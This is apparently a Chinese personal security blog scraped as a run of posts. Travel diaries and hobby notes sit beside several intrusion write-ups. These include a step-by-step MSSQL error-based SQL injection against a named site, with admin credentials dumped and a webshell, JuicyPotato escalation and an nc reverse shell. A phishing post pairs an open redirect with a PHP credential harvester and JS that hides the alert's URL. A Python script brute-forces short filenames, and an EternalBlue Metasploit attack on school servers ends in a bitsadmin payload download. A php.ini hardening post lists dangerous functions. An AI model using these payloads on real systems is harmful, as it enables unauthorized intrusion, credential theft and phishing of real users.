在使用sqlmap继续跑数据时，发现B站所有的动态页面均报错，报错内容翻译过来大致就是数据库短时间内查询请求过多，导致线程池过载无法处理。 等了大概十分钟左右，站点又恢复了正常，所以关键时刻还是手工靠谱啊。 mssql报错注入：由于sqlmap给出的提示有报错注入，这里直接用报错注入了，相对来说效率也比较高，下面直接给出注入过程和需要注意的地方： 获取数据库名：121. http://B.com/AutoMain.aspx?ProductID=1' and db_name()&gt;0--b.com_db 查询当前数据信息：121. http://B.com/AutoMain.aspx?ProductID=1' having 1=1--Product.ProductID 踩坑指南：子查询不支持返回多条数据，且mssql不像MySQL那样支持limit，下面给出解决办法 获取表名：1234561. http://B.com/AutoMain.aspx?ProductID=1' and 1=(select top 1 name from sysobjects where xtype='u' and name !='info');--2. http://B.com/AutoMain.aspx?ProductID=1' and 1=(select top 1 table_name from information_schema.tables);--此方法可查询任意用户表：http://B.com/AutoMain.aspx?ProductID=1' and (select top 1 name from (select top 1 id,name from sysobjects where xtype=char(85)) T order by id desc) &gt; 1--获取到的用户表：AdminLogin 获取列名：123456781. http://B.com/AutoMain.aspx?ProductID=1' and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'AdminLogin') and name&lt;&gt;'id');--2. http://B.com/AutoMain.aspx?ProductID=1' and 1=(select top 1 column_name from information_schema.columns);--此方法可查询AdminLogin表的任意列：3. http://B.com/AutoMain.aspx?ProductID=1' and (select top 1 col_name(object_id('AdminLogin'),1) from sysobjects) &gt; 1--获取到用户表的列名：AdminIDUserNamePassword 获取数据：123451. http://B.com/AutoMain.aspx?ProductID=1' and (select top 1 UserName from AdminLogin where AdminID=1) &gt; 1--2. http://B.com/AutoMain.aspx?ProductID=1' and (select top 1 Password from AdminLogin where AdminID=1) &gt; 1--获取到的账号密码：adminislamabad 效果如图： 旁站GetShell：通过获取到的账号密码成功登B站的网站后台 文件上传处只校验文件类型，上传图片马抓包改后缀即可，连接shell后发现无权限跨目录，只能继续提权了 主机提权：一开始看了下系统进程应该没有杀软（其实是有的，国外的小众杀软名字不是很起眼），补丁也没打几个，以为很好提。 想着常规操作就能拿下，直接穿了CS的远控上去运行，等了会发现并没有主机上线，仔细一看刚传的木马没了，才知道遇上杀软了。然后又试了几个本地提权的exp，不是被杀就是报错。 后来想起来土司有老哥分享过免杀的提权神器：JuicyPotao，使用方法：https://www.4hou.com/technology/13698.html 成功提权： 提权成功之后，后面的操作就行云流水了，目的是拿 A.com 的shell ，先用nc反弹出system权限的cmdshell，然后可以直接写马，也可以远程下载，等等姿势还有很多… 参考文章：https://www.jianshu.com/p/0cf7bd46237e https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI","link":"/2019/07/26/剑走偏锋-旁站入侵到提权/"},{"title":"YIT-CTF>隐写术:贝斯的照片","text":"出题思路：先将答案生成二维码图片，然后将二维码图片进行base64加密； 得到秘文之后，写入txt中，之后将.txt修改为.exe [然而这样直接运行.exe是运行不了的，从而达到题目所说的被病毒加密的效果( ●´∀｀●)] 百度base64编码：传送门 题目用到的base64加密解密在线工具：传送门 解题思路：题目名为“贝斯”的照片，与base谐音； 以TXT格式打开文件，发现内容符合Base64编码。直接去解密明文没有得出答案，但是提示了是png格式。于是乎转图片解码，得出二维码，微信扫一扫即可得到答案。 特别感谢：出题人GFA","link":"/2017/05/14/YIT-CTF  隐写术：贝斯的照片/"},{"title":"匹配关键字删除文本行","text":"当我们采集了一批域名的时候，不要急切的丢到轮子里去扫，什么站能扫什么站不能扫，心里一定要有点b数。 打开采集好的域名最新提示：Notepad++作者反G，坚决抵制它！！！！需要的软件：Notepad++ 快捷键：Ctrl+H ，弹出查找/替换窗口，搜索一下gov 设置替换规则输入下面的正则表达式，然后查找模式选择正则表达式，点击全部替换即可删除含有gov的每一行： 1.*gov.*\\r\\n","link":"/2019/02/14/匹配关键字删除文本行/"},{"title":"南锣鼓巷游记","text":"南锣鼓巷是一条胡同，位于北京中轴线东侧的交道口地区，北起鼓楼东大街，南至平安大街，宽8米，全长787米，与元大都同期建成。是北京最古老的街区之一，至今已有740多年的历史。也位列规划中的25片旧城保护区之中。因其地势中间高、南北低，如一驼背人，故名罗锅巷。到了清朝，乾隆十五年(1750年)绘制的《京城全图》改称南锣鼓巷。 我与世界的关系，我们用艺术解决 一个胡同口 色彩斑斓，生活亦此 旅伴 老街 后海","link":"/2017/08/16/南锣鼓巷游记/"},{"title":"博客全面开启https","text":"首先要感谢好朋友基航提供的帮助和思路，博客现已全面开启https啦。 怎么说呢，小绿锁简直强迫症的福音啊啊啊啊~ 这里分享一下操作步骤： 0x01 首先需要申请下域名的证书[这里不再赘述] 0x02 然后进入腾讯云的CDN服务 添加网站 配置域名的证书,强制跳转https[其他根据自己需要设置] 等待验证 0x03 验证通过后，在云解析将CDN生成的CNAME添加进去，等待解析生效就可以了 这里还要注意，一开始我的图片全部存储在七牛云[全部为http资源]，开启了https之后要保证站内引用的资源都是https传输过来的，不然小绿锁会提示链接不安全。 所以，我把图片直接搬到了github上。 至此，全站开启https完成。","link":"/2017/12/05/博客全面开启https/"},{"title":"古北水镇小记","text":"去水镇的计划很早之前就想好了，最近几天才有时间，去到了哪里以后，无论是风景还是环境只能用惊艳来形容。 去之前选的住宿是民宿，在附近的一个民俗村里，距离水镇不到两公里，来回都有车接送所以很方便。房东大姐热情又实在，住的很舒服。 来到景点门口的第一眼就被美到了，蓝天白云，青山绿水，配上十分古朴的建筑风格，有种世外桃源的感觉。 偶然发现一处台阶上的涂鸦，完美的诠释了水镇的主题。 这是在永顺染坊拍的，说实话，近门第一眼看到挂着一堆布条还挺诡异的，不过上到二楼风景还是很好的。 在路上遇见一只橘猫，哇，这个猫聪明的简直不配做个喵星人，想喂它点吃的，刚一拿包，它就主动过来对我们喵喵叫，一点也不怕生人，估计人家靠脸吃饭不是一次两次了吧（突然感觉自己还不如一只喵）。 这是一个镖局的比武场，里面有点武器，外面有梅花桩，人形桩什么的，不过好像也没啥特别的地方。。 太阳刚落山，灯光也都亮了起来，傍晚的水镇像是换上了一件新的衣服，比起白天又是另一种美。 后来跑到了白天已经踩好点的一个山顶上，感觉这里应该是水镇最高，视野最开阔的地方了，整个小镇的景色一览无余，尽收眼底，虽然是晚上，但是没有一条路是没有灯的，胆子小的不用害怕，随便玩随便走。 走之前最后一张照片，这里是入口也是出口。虽然玩了一天有些累，心请还是特别放松的。 第二天早起要离开了，阳光很好也没什么风，感觉比昨天要暖和太多了，留个“影”走喽~","link":"/2019/03/30/古北水镇小记/"},{"title":"可我浪费着我寒冷的年华","text":"每个人都是一段故事，或许悲伤，或许快乐。 小七是一个不太喜欢表达情绪的人， 开心的时候笑一笑， 不开心的时候也会笑一笑。 长此以往， 以至于自己也分不清， 有些事到底是开心还是不开心。","link":"/2019/03/25/可我浪费着我寒冷的年华/"},{"title":"圈子社区登陆处任意url跳转实现钓鱼用户","text":"漏洞本身倒是没什么大危害，稍加利用下还蛮好玩的。 漏洞详情圈子社区登陆首页默认链接：https://www.secquan.org/Login?jump=aHR0cHM6Ly93d3cuc2VjcXVhbi5vcmc= 对于上面红框中jump后内容的base64解码为:https://www.secquan.org 这里使用 https://www.baidu.com 的base64加密后的内容替换下，构造出的链接为： https://www.secquan.org/Login?jump=aHR0cHM6Ly93d3cuYmFpZHUuY29t 登陆成功后即自动跳转至百度。 利用设想 实际利用访问构造好的钓鱼链接，正常登陆（能力有限，做不到太完美，不过看着倒是像那么回事）： 先看一下页面跳转时弹窗的效果※ 以下均在qq中测试效果 其实弹窗这里的标题默认是有网址显示的，这样等于直接暴露地址了，加一段JS来重写alert方法即可。 1234567891011&lt;script&gt;window.alert = function(name){var iframe = document.createElement(\"IFRAME\");iframe.style.display=\"none\";iframe.setAttribute(\"src\", 'data:text/plain,');document.documentElement.appendChild(iframe);window.frames[0].window.alert(name);iframe.parentNode.removeChild(iframe);}alert(\"账号异常，请重新登陆\");&lt;/script&gt; 首页成品是这样的（勉勉强强以假乱真）Ctrl+S将社区登陆的首页静态页面保存在了本地，进行了一番修改（配合接收账号密码的php文件），弄了会儿发现验证码无法调用，索性直接删除吧，感觉这个验证码是最失败的地方。 后台简单写个接收账号密码的php页面1234567&lt;?php $email=$_POST['email'];$password=$_POST['password'];$result=$email.\"|\".$password; file_put_contents(\"fish.txt\", $result.PHP_EOL, FILE_APPEND);echo \"&lt;script&gt;window.location.href='https://www.secquan.org'&lt;/script&gt;\"; ?&gt; 钓鱼成功 最后用户输入的内容被写入到同目录下的fish.txt中,且页面被重定向至 https://www.secquan.org ，由于之前登陆成功的会话还在，所以直接就是已登陆的状态了。","link":"/2019/06/10/圈子社区任意url跳转实现账号钓鱼/"},{"title":"在线Google Hacking小工具","text":"写这个轮子的原因是自己在挖src的时候，会用到Google Hacking语法进行信息搜集，自己懒到ctrl+c/ctrl+v都不想按，就有了这个轮子的诞生。 以后很可能会更新成动态语言的，方便扩展更多语法从而灵活运用，敬请期待吧。 在线版：https://ght.se7ensec.cn/ GayHub：https://github.com/r00tSe7en/GoogleHackingTool","link":"/2019/01/20/在线Google Hacking小工具/"},{"title":"《头文字D》-童年的美好回忆","text":"每天清晨都有一辆AE86在秋名山上漂移，而且速度快得惊人，这辆AE86属于藤原豆腐店。 今天下课在校园广播里听到Jay的《一路向北》，想起了这部电影，便重温了一下；伴随着年龄的增长，对电影内容的理解也会加深，用一句话来形容就是：小时候看的是赛车，长大点看的是纯纯的爱情，现在则更多的是美好的回忆和感悟。 带着“藤原豆腐店”几个字的白色AE86，在凌晨的秋名山上摇曳着光芒一晃而过 车中昏昏欲睡的少年，山头明明暗暗的灯塔 车行处，一阵风卷起片片落叶，路边沉默的地行菩萨 车里的豆浆涌成了一圈漩涡，却没有一滴倾洒 伴随着几个镜头，故事就这样拉开了序幕…… 第一次看的记忆已经很模糊了 只是每次音乐一起我就会想到那个夏天黏腻腻的夜晚 第二次再看时，应该是我初中毕业吧 刺激，甜蜜而又悲伤 现在再看来，完全就是回忆和感悟了 作为大多数的我们，还是像拓海同学吧 时时会觉得局促，尴尬，不自信 在面对爱情的得失时，总是会不知所措 拓海选择了加入Project D车队，坚定了自己的梦想 我们何尝不是也该如此呢 流年易逝去，青春不再来 每个人都该找到真正属于自己的世界","link":"/2017/12/06/头文字D-童年的美好回忆/"},{"title":"实现WEB环境根目录导航","text":"为了避免代码丢失，重复造轮子，特此留念（美化代码写的烂的一笔…） 引言平时本地web环境去实现一些东西，访问目录时总是要去复制目录名，实在忍受不来就想写个页面直接实现列举目录+页面跳转。 想法一开始想到写个纯静态的页面，不过为了以后方便，还是用php来实现一下功能吧，毕竟没谁想去一遍一遍的修改代码。 实现代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;PhpLabs-本地实验室&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;black&quot;&gt;&lt;style&gt; a{ font-size:18px; color:white; text-align:center; } a:link {text-decoration:none;} /* unvisited link */ a:visited {text-decoration:none;} /* visited link */ ul{ width:500px; } li{ border-style:ridge; border-width:5px; border-color:green; } li:hover {text-decoration:underline;background-color:#FF704D;} /* mouse over link */ span{ font-size: 100px; color:red; position:fixed; top:300px; right:300px; }&lt;/style&gt;&lt;?php$d=dir(&quot;./&quot;);$e=null;echo &quot;&lt;ul&gt;&quot;;echo $d-&gt;path.$e;while(false !== ($e= $d-&gt;read())) { echo &quot;&lt;li&gt;&lt;a href=$e target=_blank &gt;$e&lt;/a&gt;&lt;/li&gt;&quot;.&quot;&lt;br&gt;&quot;;}$d-&gt;close();echo &quot;&lt;/ul&gt;&quot;;echo &quot;&lt;span&gt;PhpLabs&lt;br&gt;本地实验室&lt;/span&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;","link":"/2018/09/05/实现WEB环境根目录导航/"},{"title":"我们来给电喵编个故事吧","text":"怪兽猫英文名字Monstercat（原先叫Monstercat Media），是一个在2011年7月，由Mike Darlington（现任CEO）和Ari Paunonen（现任COO）在加拿大温哥华建立的电子舞曲音乐公司。 专辑封面讲述了一只怪喵打天下的励志故事，详见下文。。。 怪猫是某个星际舰队的指挥，可在途径地球时遭到了不明攻击，他只得带着祖传的耳机弃舰 飞船坠落，怪猫成功逃脱 逃脱后遇到一群地球的DJ，聊天后发现志趣相投于是成为了好基友 怪猫在谈论结束后（事后）思考猫生… 觉得无聊怪猫索性顺流而下趟着水，冒着淹死的风险不走岸上走河里，走向远方的城市（喵星人不怕水吗？） 他来到了加拿大的某个城市，遇到之前的好基友而那个好基友为他介绍了更多的好基友于是他们欢乐的搞基 怪猫发现有很多人围着一个舞台（聚众交易），坐在石头上又思考起了猫生，想到了远在宇宙另一边星球上他的人民 觉得思考猫生太无聊的怪猫决定加入交易会 这讲的是怪猫交易会圆满结束后和他的五个好基友一起搞一只鸡的故事 无聊的怪猫企图打败警察征服加拿大 经过精心周密的策划伟大的怪猫革命开始了，察那个臂徽可以看出来是MUSIC INDUSTRAY也就是指怪猫带领一队DJ向音乐界发出挑战 革命成功了的怪猫和好基友们快乐幸福地生活在一起 随着人们不断的觉醒怪猫觉得完成了大业很欣慰 于是事业有成的怪猫认识到了生活不只有眼前的苟且还有诗和远方，进行了一段长期的地质探索 表面上怪猫来到户外观看极光，可事实上看极光不需要天文望远镜，所以是怪猫在寻找自己的星球 怪猫来到矿洞探索地球的矿产资源 怪猫发现在矿洞的尽头有地下溶洞连通着深海，本想钓鱼充饥没想到钓到很多珠宝 怪猫以钓上来的宝物为线索，突破喵喵物种怕水的缺陷极限潜水，找到了沉船残骸 然后怪猫又凭着决心，勇攀高峰一览众山小 怪猫从顶峰一跃而下乘着滑翔伞来到当年梦想萌芽的地方 才发现多年之后他的好基友们还在忠实地等着他 怪猫为迎接他归来的人们举办了盛大的交易会 交易会结束后，怪猫和好基友们开心的在野外玩耍 此时的怪猫浑然不知城市上空早已阴云密布 回到城市后他发现一切都变了，一个和他是同类但只有眼睛的猫摧毁并占领了他一手建立的梦想之城 怪猫与黑猫进行了殊死搏斗，正当怪猫要使出绝招时黑猫召唤来了他开着宇宙飞船的好基友 怪猫被黑猫的宇宙飞船吸走了 回到了怪猫自己的星球后才发现最开始他乘坐的飞船受到了攻击，是由于黑猫展开了一场军事政变，将原本是领袖的怪猫赶下台 就在这时怪猫的好基友得知了这个消息誓死为怪猫报仇 怪猫在基友的帮助下打败了黑猫并夺回了耳机，取得了最终的胜利","link":"/2018/07/27/我们来给电喵编个故事吧/"},{"title":"我的梦想是年少有为","text":"其实这篇文章是自己两年前写的，旧博客备份下来以后就安静的躺在硬盘里了，重新编辑下留做纪念吧。 天真又懵懂​ 初中住校，封闭式管理，大约16岁开始接触电脑，当时一个月放一次假，就回家打打单机游戏，后来总是想打破游戏的规则限制，于是就修改游戏的配置文件，或者直接开挂，可以说是我对这方面感兴趣的开始。 ​ 初升高的那个暑假，有一次搜索Q币充值截图生成器，发现了一个叫瑞雪的小朋友，12岁的他自学易语言，开发出这个软件，当时觉得很新奇。于就有了第一次接触编程软件的经历，但是因精力有限，没能坚持学下去，仅仅只会改改源码，拿着自己改的源码做的记事本软件，钓鱼软件，病毒生成软件……玩的不亦乐乎。 ​ 然后有一天在瑞雪的百度云里，无意间接触到了黑客这个词汇，虽然很熟悉，但是感觉很神秘，于是就开始百度，在看了一大堆屁用没有的介绍后，偶然发现了一个很吸引我的链接［玄风小组黑客网盘］，好奇的我点了进去发现有个登入密码，我试探性的输入了123，回车一摁，居然进去了！当时心里很激动(或许这就是最初次体验的破解密码的快感吧），黑色的网盘界面中，一个个从未见过的名词〔木马，抓鸡，渗透，远控，DDOS…〕引起了我强烈的好奇心。 中二且热血​ 转眼高中开学，依旧封闭式教育，只有周日下午半天和每个月的两天假期，每周日下午会和同学一起去网吧，当在同学在游戏世界里大喊着德玛西亚，奋力厮杀时，我就在一旁瞎研究。还记得当时自己每次都会把网盘里的部分软件下载下来，但是因为什么都不会，上来就是瞎摁，不过摁着摁着也就慢慢明白了软件的功能和使用方法。后来去书店买练习册时看到了一本书《黑客攻防实战从入门到精通》（其实内容都是一些过时的东西了），当时想都没想就把它买了下来，然后就开始了“进步最快”的一个阶段。因为平时没有办法出学校，所以就每天中午睡觉的时间都来看这本书，不会的就做下笔记，记了好多cmd命令，还贴在墙上，不懂得就找机会去百度查，差不多用了多半年的时间，感觉能看懂了书里的大部分内容。而且当时百度到了一套玄风小组的初级渗透教程，放在云盘里，放假有空就会看一下，然后就自己一步一步跟着视频学，虽然听起来很枯燥，不过每当我体会到了一些新的东西，就会觉得很满足，很开心。 ​ 上面那个ID和QQ上大学之后我都没再用过了，空间被我加了锁，锁住了逝去的青春，也锁住了所谓的“情窦初开”，现在只是当个游戏号。以上这个时间段，搞过别人，也被别人搞过，学的三脚猫功夫很多很杂，比如（钓鱼，盗号，社工，刷钻……很多东西就不贴图了，貌似是大多数人的必经之路啊），不过在后来的学习就不是很简单了，有些东西没有人告诉你，你要自己去百度，去过滤筛选有用的信息，一次又一次遇到瓶颈，然后突破，再次遇到瓶颈，再突破。遇到问题难以解决的的感觉很不好，但是当你自己突然领悟到它的真谛时，你会觉得豁然开朗，就这样自己慢慢接触的东西越来越多，会的也越来越多。 梦想和成长​ 大学期间，个人感觉是进步最快的一个阶段，因为觉得不甘心当个脚本小子，就报了轮子（软件工程）专业，最直接的原因：懂了程序就懂了原理，懂了原理就懂得利用。期间小迪哥的教程（虽然不认识），可以算是我的启蒙老师，让我正式入了门。从杂乱无章的学习到相对系统的认知，这是个我认为最难跨越的阶段，不记得自己到底用了多久，不过一个深切的感觉，越学觉得越菜，越觉得自己不懂得太多。在大学里有幸结识了志同道合的学长学弟，组建了信安社团，参加了一些大大小小CTF比赛，也结识了一些网络上的朋友，互相学习共同进步，真的是见识的人越多，越清楚自己和大佬的差距 (&gt;_&lt;) ，进入了特别想进入的T00ls，圈子等国内知名论坛，见识到了更多的骚操作。 总结一下暂时完成的Flag（毕业之前继续努力）：漏洞平台提交，SRC提交，造轮子，CTF比赛证书，CNVD证书，CVE编号，，，大学完了以后再继续写吧。 路漫漫其修远兮，吾将上下而求索。","link":"/2019/02/18/我的梦想是年少有为/"},{"title":"斐讯K2折腾小记","text":"这几天在家里实在是无聊，突然想起之前狗东拿到的斐讯K2路由器（有厂家预制后门，有弹窗广告，用过一阵总是自己掉线，后来就一直吃灰了），路由器：我觉得我还能抢救一下。 去百度教程，在吾爱破解上找到个神器： 刷入breed不用降级，关闭防火墙，开启电脑telnet之后，路由器账号密码设置成admin，路由器LAN口用网线直连到电脑 打开软件后路由器IP地址就是默认的192.168.2.1，刷机方案选全自动，其他根本不用管。点下「开始刷机」就能一次性完成 breed 的刷入。它会先帮你设置密码、刷入降级固件，开启 路由器的telnet 和 ssh，再刷入 breed 什么的。整个过程踏都会帮你完成，但如果过程中出错了，你又不知道如何解决的话，那么请尝试另一种方法吧。 进入breed等到软件显示「刷机完成」后： 等待2分钟左右，先拔掉路由器电源 保持断电状态下，按住路由器后面的重置按钮不放，插上电源，持续按住10秒左右，再松开按钮，等待1分钟 如果顺利，电脑浏览器访问 192.168.1.1 进入到「breed Web 控制台界面」 刷入固件依次选择：「固件更新-&gt;固件-&gt;浏览-&gt;你的固件-&gt;上传-&gt;更新固件」 等待路由器刷机成功并重启即可访问管理后台 这里要注意的是，不同固件的默认管理后台地址不一样，默认的账号密码也不一样，下载固件时一定要看好说明 我一开始刷入的是老毛子固件（如下图），功能很全很强大，但是不知道为什么很不稳定，自己莫名奇妙断网，而且2.4G 的网速奇慢无比，可能是路由性能太差带不动吧。。。 之后我又去找了一个官方修改版固件（图见文章开头），再次进入breed用同样的方法刷入固件之后，完美启动，超级稳定不断网不掉速，功能不是那么多，但是足够用了。","link":"/2019/01/14/斐讯K2折腾小记/"},{"title":"浅析Windows短文件名漏洞","text":"0x01 短文件名的介绍短文件名的由来windows下的短文件名是dos+fat12/fat16时代的产物，又称为8dot3命名法类似于PROGRA1（目录）或者元素周1.exe（文件）这样的名称8是指文件名或目录名的主体部分小于等于8个字符3是指文件名或目录名的扩展部分小于等于3个字符中间以 . 作为分割在FAT16文件系统中，由于FDT中的文件目录登记项只为文件名保留了8个字节，为扩展名保留了3个字节，所以DOS和Windows的用户为文件起名字时要受到8.3格式的限制。 为什么现在Windows系统还存在短文件名这种表示？从win95开始，采用fat32已经支持长文件名，但是为了保持兼容性，保证低版本的程序能正确读取长文件名文件，每当创建新文件或新目录时，系统自动为所有长文件名文件创建了一个对应的短文件名。使这个文件既可以用长文件名寻址，也可以用短文件名寻址。 0x02 Windows演示开启查询：2为开启状态，1为关闭状态fsutil 8dot3name query 文件测试 命名规则1）符合DOS短文件名规则的Windows下的长文件名不变。2）长文件名中的空格，在短文件名中被删除。3）删除空格后的长文件名，若长度大于8个字符，则取前6个字符，后两个字符以”#”代替，其中”#”为数字，数字根据前六个字符相同的文件名的个数顺延。若个数超过10个则取前5个字符，后三个字符以”##”代替，其中”##”为两位数字，若个数大于100也依此规则替换。4）对使用多个”．”隔开的长文件名，取最左端一段转换为短文件名，取最右一段前三个字符为扩展名。 0x03 漏洞利用漏洞环境：一般是iis配上.net的 或者Apache+Windows 以dedecms为例：dedecms里面/data/backupdata/目录里面有织梦的备份文件，而且还是txt格式 根据短文件名的漏洞利用方式：只有前六位字符直接显示，后续字符用~1指代。如果存在多个文件名类似的文件的话（名称前6位必须相同，且后缀名前3位必须相同），其中数字1还可以递增。且后缀名最长只有3位，多余的被截断。 python测试脚本（Python3）：123456789101112131415161718192021222324252627#!/usr/bin/env python# -*- conding:utf-8 -*-import urllib.requestheaders = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2','Connection': 'close','Upgrade-Insecure-Requests': '1'}url=\"localhost/dedeCMS\"dir = '/data/backupdata/dede_a~'for i in range(1,6): urls = 'http://'+url + dir + str(i) + '.txt' try: head = urllib.request.Request(urls, headers=headers) data = urllib.request.urlopen(head, timeout=3).getcode() if data == 200: print('########成功########' + urls) else: print('错误' + urls) except Exception as e: print(\"访问失败\",urls) print(e) continue 逐一访问测试成功结果后，发现了账号密码： 0x04 漏洞修复通用有效方法：禁用windows系统中的短文件名功能。打开注册表并打开此目录 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem修改 NtfsDisable8dot3NameCreation 的值为1 。修改完成后，需要重启系统生效。 ※需要注意：即使关闭了短文件名功能，也不会删除原有创建过的短文件名。","link":"/2018/11/15/浅析Windos短文件名漏洞/"},{"title":"浅析php.ini设置与Web安全","text":"0x01 打开php的安全模式php的安全模式是个非常重要的内嵌的安全机制，能够控制一些php中的函数，比如 system()，同时把很多文件操作函数进行了权限控制，也不允许对某些关键文件的文件，比如 /etc/passwd 但是默认的php.ini是没有打开安全模式的，我们把它打开： safe_mode = on 0x02 用户组安全当 safe_mode 打开时，safe_mode_gid 被关闭，那么php脚本能够对文件进行访问，而且相同组的用户也能够对文件进行访问。 建议设置为： safe_mode_gid = off 如果不进行设置，可能我们无法对我们服务器网站目录下的文件进行操作了，比如我们需要对文件进行操作的时候。 0x03 安全模式下执行程序主目录如果安全模式打开了，但是却是要执行某些程序的时候，可以指定要执行程序的主目录： safe_mode_exec_dir = D:/usr/bin 一般情况下是不需要执行什么程序的，所以推荐不要执行系统程序目录，可以指向一个目录， 然后把需要执行的程序拷贝过去，比如： safe_mode_exec_dir = D:/tmp/cmd 但是，我更推荐不要执行任何程序，那么就可以指向我们网页目录： safe_mode_exec_dir = D:/usr/www 0x04 安全模式下包含文件如果要在安全模式下包含某些公共文件，那么就修改一下选项： safe_mode_include_dir = D:/usr/www/include/ 其实一般php脚本中包含文件都是在程序自己已经写好了，这个可以根据具体需要设置。 0x05 控制php脚本能访问的目录使用 open_basedir选项能够控制PHP脚本只能访问指定的目录，这样能够避免PHP脚本访问 不应该访问的文件，一定程度上限制了phpshell 的危害，我们一般可以设置为只能访问网站目录： open_basedir = D:/usr/www 0x06 关闭危险函数如果打开了安全模式，那么函数禁止是可以不需要的，但是我们为了安全还是考虑进去。比如， 我们觉得不希望执行包括 system()等在那的能够执行命令的php函数，或者能够查看php信息的 phpinfo() 等函数。 那么我们就可以禁止它们： disable_functions=system,passthru,exec,shell_exec,popen,phpinfo 如果你要禁止任何文件和目录的操作，那么可以关闭很多文件操作： disable_functions=chdir,chroot,dir,getcwd,opendir,readdir,scandir,fopen,unlink,delete,copy,mkdir,rmdir,rename,file,file_get_contents,fputs,fwrite,chgrp,chmod,chown 以上只是列了部分不叫常用的文件处理函数，你也可以把上面执行命令函数和这个函数结合， 就能够抵制大部分的 phpshell了。 0x07 关闭PHP版本信息在http头中的泄漏我们为了防止黑客获取服务器中php版本的信息，可以关闭该信息泄露在http中： expose_php = Off 比如黑客在 telnet www.phpddt.com 80 的时候，那么将无法看到PHP的信息。 0x08 关闭注册全局变量在PHP中提交的变量，包括使用POST或者GET提交的变量，都将自动注册为全局变量，能够直接访问，这是对服务器非常不安全的。 所以我们不能让它注册为全局变量，就把注册全局变量选项关闭： register_globals = Off 当然，如果这样设置了，那么获取对应变量的时候就要采用合理方式，比如获取GET提交的变量var，那么就要用 *$_GET[‘var’] *来进行获取。 0x09 打开magic_quotes_gpc来防止SQL注入SQL注入是非常危险的问题，小则网站后台被入侵，重则整个服务器沦陷，所以一定要小心。 php.ini中有一个设置： magic_quotes_gpc = Off 这个默认是关闭的，如果它打开后将自动把用户提交对sql的查询进行转换，比如把 ' 转为\\'等，这对防止sql注射有重大作用。所以我们推荐设置为： magic_quotes_gpc = On 0x10 错误信息控制一般php在没有连接到数据库或者其他情况下会有提示错误，一般错误信息中会包含php脚本当前的路径信息或者查询的SQL语句等信息，这类信息提供给黑客后，是不安全的。 所以一般服务器建议禁止错误提示： display_errors = Off 如果你却是是要显示错误信息，一定要设置显示错误的级别，比如只显示警告以上的信息： error_reporting = E_WARNING &amp; E_ERROR 当然，还是建议关闭错误提示。 0x11 错误日志建议在关闭 display_errors 后能够把错误信息记录下来，便于查找服务器运行的原因： log_errors = On 同时也要设置错误日志存放的目录，建议根apache的日志存在一起： error_log = D:/usr/local/apache2/logs/php_error.log 注意：给文件必须允许apache用户的和组具有写的权限。","link":"/2018/09/19/浅析php.ini设置与Web安全/"},{"title":"渗透学校某内网服务器","text":"”黑“掉自己的学校，可能是大多数黑阔们学生时代共同的执念。 前言：心血来潮，突然想看看学校有没有能用永恒之蓝打下来的机器，顺便来一波内网渗透，想想上一次测试还是刚爆出永恒之蓝的利用工具的时候，那时候msf都还没整合进去，现在直接就能用msf方便多了。 信息收集：已知 10.10.10.0/24 为学校各种服务器使用的IP 使用MSF中的批量ms17_010验证模块： 123456msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 10.10.10.0-10.10.10.254rhosts =&gt; 10.10.10.0-10.10.10.254msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set threads 20threads =&gt; 20msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit 扫描的结果如下 漏洞利用：获取cmdshell经测试IP为10.10.10.104的主机（2008 x64）可以成功利用： 该主机关键信息： 8080 端口运行着tomcat的服务，3389 端口未开放，3306 运行MySQL服务，其他端口暂不考虑。 1234567891011121314151617181920212223242526msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show optionsModule options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target.Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packsmsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.10.104rhosts =&gt; 10.10.10.104msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run 如下图成功返回了一个CmdShell，而且还直接是System权限，不过比较疑惑的是，tasklist /SVC 看了下当前进程，有360的主动防御，按道理应该会拦截住的，可能我运气好吧2333： cmdshell升级meterpreter（失败）由于cmdshell不如meterpreter好用（meterpreter功能比较强大），尝试升级成meterpreter 第一种方法： 123456789101112131415msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; use post/multi/manage/shell_to_meterpreter msf5 post(multi/manage/shell_to_meterpreter) &gt; show optionsModule options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on.msf5 post(multi/manage/shell_to_meterpreter) &gt; set session 1session =&gt; 1msf5 post(multi/manage/shell_to_meterpreter) &gt; run 第二种方法： 1sessions -u 1 然后不知道为什么失败了（换个思路吧）： 远程文件下载：windows自带的远程文件下载功能很强大，需要用什么就远程下载什么好了。 一开始就想直接开端口，加账号登陆，没想到远程连接出现问题了，然后又想到可以拿下shell试试 开启远程连接本机开一个apache服务，把 3389.bat 放到 /var/www/html 下，cmdshell 里执行，下载成功后，运行3389.bat 1bitsadmin /transfer n http://IP/open3389.bat c:\\windows\\3389.bat 